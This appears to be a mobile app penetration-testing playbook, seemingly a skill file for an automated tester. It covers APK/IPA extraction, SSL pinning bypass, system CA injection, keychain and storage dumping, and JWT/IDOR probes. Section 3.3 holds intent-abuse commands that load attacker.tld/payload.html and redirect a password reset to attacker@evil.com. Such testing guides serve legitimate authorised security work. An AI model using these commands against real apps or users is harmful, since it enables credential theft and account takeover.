# Mobile Application Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1634 (Data from Mobile Device), T1636 (Credentials from Mobile Device), T1406 (Obfuscated Files or Information)
**OWASP Mapping:** MASVS V1-V8 (OWASP MASVS), Mobile Top 10 M2-M9
**Severity:** Critical / High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: mobile-security-v1
category: mobile-security
author: HiveBreach
mitre_attack_id: [T1190, T1634, T1636, T1406]
owasp_mapping: [MASVS-DATA-STORAGE, MASVS-CRYPTO, MASVS-AUTH, MASVS-NETWORK, MASVS-PLATFORM, MASVS-RESILIENCE]
tags: [mobile-security, android, ios, apk, ipa, frida, objection, jadx, apktool, ssl-pinning, intent, deep-link, T1190]
environments: [android, ios, mobile-backend-api]
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Mobile App Threat Modeling (OWASP MASVS)

| MASVS Category | Focus | Primary Risks |
|---|---|---|
| MASVS-DATA-STORAGE | Data at rest | Plaintext PII, tokens, credentials |
| MASVS-CRYPTO | Cryptography | Hardcoded keys, weak algorithms |
| MASVS-AUTH | Auth/Authz | Bypassable login, IDOR, weak tokens |
| MASVS-NETWORK | Communication | Cleartext traffic, broken pinning |
| MASVS-PLATFORM | Platform interaction | Exported components, deep links, IPC |
| MASVS-RESILIENCE | RE defenses | Weak root/JB detection, no tamper resistance |

Inputs: APK/IPA binary, AndroidManifest.xml / Info.plist, backend API surface, sensitive data classes, trust boundaries (device-server, app-to-app IPC, WebView-to-native).

### 1.2 App Acquisition

```bash
# Android - pull APK from connected device
adb shell pm list packages | grep -i target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-*/base.apk target.apk

# iOS - decrypted IPA from jailbroken device
python3 dump.py com.target.app
```

### 1.3 Binary Structure

```
APK: META-INF/ (v1 sig), AndroidManifest.xml, classes.dex (+N), res/, assets/, lib/<abi>/*.so, resources.arsc
IPA: Payload/TargetApp.app/ -> TargetApp (Mach-O, FairPlay encrypted), Info.plist, Frameworks/, embedded.mobileprovision
```

### 1.4 Technology Fingerprint

| Indicator | Framework | Notes |
|---|---|---|
| `assets/index.android.bundle` | React Native | Read bundle, find bridge methods |
| `libflutter.so` | Flutter | Dart snapshot, reFlutter |
| `UnityPlayerActivity` | Unity | Intent extras to CLI flags |
| `libapp.so` | Xamarin | DLLs in assemblies |
| Cordova `config.xml` | Hybrid | Whitelist + JSB bridge |

---

## 2. Confirmation

### 2.1 Static Confirmation (Android)

```bash
apktool d target.apk -o apk_out/ -f
jadx -d jadx_out/ target.apk --deobf --show-bad-code
d2j-dex2jar target.apk -o target.jar
aapt2 dump badging target.apk | head -40
apksigner verify --verbose target.apk
```

### 2.2 Static Confirmation (iOS)

```bash
unzip target.ipa -d ipa_out/
plutil -p ipa_out/Payload/*.app/Info.plist
codesign -d --entitlements :- ipa_out/Payload/*.app/TargetApp
class-dump -H ipa_out/Payload/*.app/TargetApp -o headers_out/
dsdump --objc ipa_out/Payload/*.app/TargetApp
rabin2 -zzq ipa_out/Payload/*.app/TargetApp | grep -iE "password|secret|api_key|token"
```

### 2.3 Confirmation Checklist

- [ ] Hardcoded secrets/keys/URLs in source, resources, assets
- [ ] `allowBackup=true` / debuggable / cleartext traffic enabled
- [ ] Exported components without permission protection
- [ ] SSL pinning absent or bypassable
- [ ] Insecure storage (SharedPreferences/NSUserDefaults, SQLite/Realm/CoreData, logs)
- [ ] API auth flaws (JWT none, missing PKCE, IDOR)

---

## 3. Exploitation

### 3.1 SSL Pinning Bypass

```bash
# Android - Frida universal unpin + Objection
frida -U -f com.target.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass --no-pause
objection --gadget com.target.app explore --startup-command "android sslpinning disable"

# iOS - Objection
objection --gadget com.target.app explore
# REPL: ios sslpinning disable
# REPL: ios hooking watch class NSURLSession

# Static removal (repack)
apk-mitm target.apk
```

### 3.2 Certificate Trust Stores

```bash
# Android - add Burp CA as system cert (rooted/emulator)
adb root && adb remount
adb push cacert.cer /system/etc/security/cacerts/9a5ba575.0
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 && adb reboot

# Android 7+ apps must opt into user CAs via network_security_config debug-overrides
# iOS - install Burp CA profile, then Settings > About > Certificate Trust Settings > enable
```

### 3.3 Android Intent Vulnerabilities

```bash
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target.app/.SensitiveActivity;end'
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.target.app/web?url=https://attacker.tld/payload.html"
adb shell am broadcast -a com.target.app.RESET_PASSWORD --es email attacker@evil.com
```

### 3.4 iOS Data Inspection with Objection

```bash
objection --gadget com.target.app explore
# REPL: env / ios keychain dump / ios nsuserdefaults get
# REPL: sqlite connect app_data.db ; sqlite execute query "SELECT * FROM accounts"
# REPL: ios pasteboard monitor
```

### 3.5 Mobile API Authentication Testing

```bash
jwt_tool <token> -X a                     # JWT none algorithm
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
curl -k -s https://api.target.com/api/v1/users/1338/profile \
  -H "Authorization: Bearer $TOKEN"       # IDOR probe
# OAuth redirect_uri hijack: myapp://callback claimable by a malicious app
```

---

## 4. Tool-Specific Guidance

| Tool | Purpose | Key Invocation |
|---|---|---|
| jadx / jadx-gui | DEX to Java | `jadx -d out/ app.apk --deobf --show-bad-code` |
| apktool | Smali + resources | `apktool d\|b app.apk -o dir/` |
| d2j-dex2jar | DEX to JAR | `d2j-dex2jar app.apk -o app.jar` |
| class-dump / dsdump | iOS ObjC headers | `class-dump -H app -o headers/` |
| frida / frida-trace | Runtime hooking | `frida -U -f pkg -l script.js` |
| objection | Exploration REPL | `objection --gadget pkg explore` |
| apkleaks | Secret extraction | `apkleaks -f app.apk -o secrets.txt` |
| mobsf | Automated analysis | `mobsf scan --source app.apk` |
| apk-mitm | Static pinning removal | `apk-mitm app.apk` |
| burpsuite | Interception | Proxy 127.0.0.1:8080 + CA on device |

**APKLeaks / MobSF / Frida:**
```bash
apkleaks -f target.apk -p "api[_-]?key|secret|token|password|aws|BEGIN.*KEY" -o out.txt
mobsf --init && mobsf runserver 0.0.0.0:8000
```
```javascript
Java.perform(function() {
  var Log = Java.use('android.util.Log');
  Log.d.overload('java.lang.String', 'java.lang.String').implementation = function(t, m) {
    console.log('[Log.d] ' + m);
    return this.d(t, m);
  };
});
```

---

## 5. PoC Generation

```markdown
## Mobile Finding — [FINDING_ID]

**Platform:** Android / iOS
**App:** com.target.app v3.2.1 / com.target.app (1.0.0)
**Severity:** High
**MASVS:** MASVS-NETWORK / MASVS-DATA-STORAGE / MASVS-AUTH

### Vector
SSL pinning absent -> full HTTPS interception; auth tokens in cleartext
SharedPreferences/NSUserDefaults; API allows BOLA on /api/v1/users/{id}.

### Evidence
1. Burp capture showing raw auth token
2. `adb shell run-as com.target.app cat shared_prefs/auth.xml` returns JWT plaintext
3. `curl /api/v1/users/1338/profile` with victim token returns victim data (200)

### Impact
- Account takeover via token theft / BOLA
- PII exfiltration, session hijack on shared device

### Remediation
- Enforce certificate pinning (OkHttp CertificatePinner / NSURLSessionDelegate)
- Encrypt at rest (EncryptedSharedPreferences / Keychain)
- Server-side object-level authorization
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Emulator or non-production jailbroken/rooted device used
- [ ] Burp/mitmproxy with tester-controlled CA only
- [ ] No production account data exposed or modified
- [ ] BOLA tested against staging API with dedicated test users
- [ ] Every finding reproduced twice (static + runtime cross-check)
- [ ] Severity validated against CVSS v4.0

### Prohibited Actions
- Modifying/deleting production user data
- Using real payment credentials
- Exceeding API rate limits / lockout thresholds
- Testing on user production devices

---

## 7. CheatSheet

```bash
adb shell dumpsys package com.target.app | grep -iE "exported|permission"
adb shell am start -W -a android.intent.action.VIEW -d "https://target.com" com.target.app
adb logcat | grep -iE "target|auth|token"
aapt2 dump xmltree target.apk AndroidManifest.xml | grep -i cleartext
cat apk_out/res/xml/network_security_config.xml
grep -rniE "(api[_-]?key|secret|password|aws_access|BEGIN (RSA|EC|OPENSSH) PRIVATE KEY)" jadx_out/ apk_out/res/values/
objection --gadget com.target.app explore --startup-command "android heap search instances com.target.auth"
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Mobile API initial access |
| T1634 | Data from Mobile Device | Insecure storage extraction |
| T1636 | Credentials from Mobile Device | Token/key theft |
| T1406 | Obfuscated Files or Information | Repackaged/packed APK |
| T1409 | Application Process Discovery | Runtime analysis hooks |
| T1417 | Input Capture | Keylogging via insecure WebView |
| T1640 | Call Control | Telephony via exports |
| T1573 | Encrypted Channel | TLS/pinning posture |

---

## 9. References

- OWASP MASTG: https://mas.owasp.org/
- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- HackTricks Mobile Pentesting: https://book.hacktricks.xyz/mobile-pentesting
- Objection: https://github.com/sensepost/objection
- Frida: https://frida.re/docs/android/
- MobSF: https://github.com/MobSF/Mobile-Security-Framework-MobSF
- APKLeaks: https://github.com/dwisiswant0/apkleaks
- apk-mitm: https://github.com/shroudedcode/apk-mitm
- MITRE ATT&CK Mobile Matrix: https://attack.mitre.org/matrices/enterprise/mobile/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
